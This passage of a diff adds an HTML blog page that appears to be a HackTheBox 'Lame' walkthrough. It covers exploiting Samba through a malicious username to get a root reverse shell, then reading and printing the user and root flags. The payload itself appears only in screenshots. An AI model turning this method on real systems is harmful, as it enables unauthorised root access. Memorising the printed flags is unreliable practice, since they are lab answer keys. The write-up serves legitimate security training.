+</div><p>Now that we have our payload and an active listener, let&rsquo;s try to login with our malicious username payload:
+<img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-exploit.png"
+	width="467"
+	height="123"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-exploit_hu2bfe68099f3d2ac4804e9206a448d4db_13222_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-exploit_hu2bfe68099f3d2ac4804e9206a448d4db_13222_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Samba exploit"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="379"
+		data-flex-basis="911px"
+	
+></p>
+<p>Now let&rsquo;s go back and check our listener.<br>
+<img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/reverse-shell.png"
+	width="470"
+	height="98"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/reverse-shell_hu56a2b23c1f7e507b72d6865a0b7601af_12906_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/reverse-shell_hu56a2b23c1f7e507b72d6865a0b7601af_12906_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Reverse shell"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="479"
+		data-flex-basis="1151px"
+	
+><br>
+We got a shell! Let&rsquo;s see who we are&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-root.png"
+	width="465"
+	height="115"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-root_hucb40988ee4040eadd084e914e81c17af_13999_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-root_hucb40988ee4040eadd084e914e81c17af_13999_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Root!"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="970px"
+	
+><br>
+WOW! We are already in a root shell.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>As we just saw, we are already in a root shell as our initial foothold. How lucky!</p>
+<h2 id="grabbing-flags">Grabbing Flags</h2>
+<p>Now that we have root access, all that is left is to grab our flags.</p>
+<h3 id="user-flag">User Flag</h3>
+<p>First, let&rsquo;s see what users are on the box:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /home
+</span></span><span class="line"><span class="cl">ls
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-users.png"
+	width="74"
+	height="98"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-users_hue665ef57af3b84e7bdfc1a66afc42581_4161_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-users_hue665ef57af3b84e7bdfc1a66afc42581_4161_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Users"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="75"
+		data-flex-basis="181px"
+	
+><br>
+Makis looks the most out of place. Let&rsquo;s check their home directory&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> makis
+</span></span><span class="line"><span class="cl">ls
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-makis.png"
+	width="78"
+	height="50"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-makis_hu32c9a8954b548e60991657b1a1525a54_2164_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-makis_hu32c9a8954b548e60991657b1a1525a54_2164_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Makis user"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="374px"
+	
+><br>
+Bingo!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>User flag: <strong>959aea813d16435122f9de52f065aa7e</strong></p>
+<h3 id="root-flag">Root Flag</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /root/root.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Root flag: <strong>ce8c570414ea852b464cd1200bbe697c</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/hackthebox/">HackTheBox</a>
+        
+            <a href="/tags/samba/">Samba</a>
+        
+            <a href="/tags/ftp/">FTP</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 novaah.xyz
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
